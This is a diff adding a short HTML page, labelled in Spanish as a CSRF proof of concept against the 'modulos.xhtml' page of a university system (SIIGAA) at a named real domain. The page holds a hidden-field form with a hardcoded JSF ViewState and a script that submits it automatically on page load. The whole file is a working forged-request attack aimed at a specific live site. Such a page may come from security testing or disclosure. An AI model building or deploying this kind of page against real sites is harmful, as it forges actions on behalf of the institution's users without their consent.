@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>CSRF PoC - modulos.xhtml</h1>
+<p>Este formulario realiza una accion en el SIIGAA sin necesidad de que el usuario este autenticado.</p>
+<form action="https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml" method="POST">
+  <input type="hidden" name="javax.faces.ViewState" value="iBBd8gLMQ33Bezhxba0uGVIk3b603JXq8AyfnztzCQL97jmWH9">
+  <input type="hidden" name="j_idt12" value="j_idt12">
+  <input type="hidden" name="frmModulos" value="frmModulos">
+  <input type="submit" value="Click aqui">
+</form>
+<script>document.forms[0].submit();</script>
+</body>
+</html>
